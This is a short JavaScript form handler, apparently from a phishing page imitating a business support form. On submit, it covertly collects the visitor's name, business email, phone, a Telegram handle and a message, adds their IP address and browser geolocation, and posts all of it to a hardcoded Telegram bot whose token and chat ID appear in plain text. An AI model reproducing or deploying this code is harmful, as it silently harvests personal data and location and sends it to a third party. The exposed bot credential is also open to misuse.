document
  .querySelector(".form_content")
  .addEventListener("submit", function (e) {
    e.preventDefault();

    // Replace with your bot token and chat ID
    const botToken = "7016735657:AAEnFhFDV7oKAecaReLPhilB9iIog00erxE";
    const chatId = "-4175907791";

    // Collect form data
    const formData = new FormData(e.target);
    const data = {};
    for (let [key, value] of formData.entries()) {
      data[key] = value;
    }

    // Get user's IP address
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((ipData) => {
        // Add IP address to data
        data.ip = ipData.ip;

        // Get user's location
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition((position) => {
            data.location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            };

            function formatData(data) {
              return `• Name: ${data.fullName}\n• Email: ${data.BusinessEmail}\n• Mobile: ${data.mobilePhone}\n• Telegram: ${data.nameFanpage}\n• Message: ${data.Note}\n• IP: ${data.ip}\n• Location: Latitude - ${data.location.latitude}, Longitude - ${data.location.longitude}`;
            }

            // Send message to Telegram bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: formatData(data),
              }),
            })
              .then((response) => response.json())
              .then((data) => console.log(data));

            // Clear form data after sending
            document.querySelector(".form_content").reset();

            // Notify successful sending
            alert("Gửi thành công");
          });
        }
      });
  });
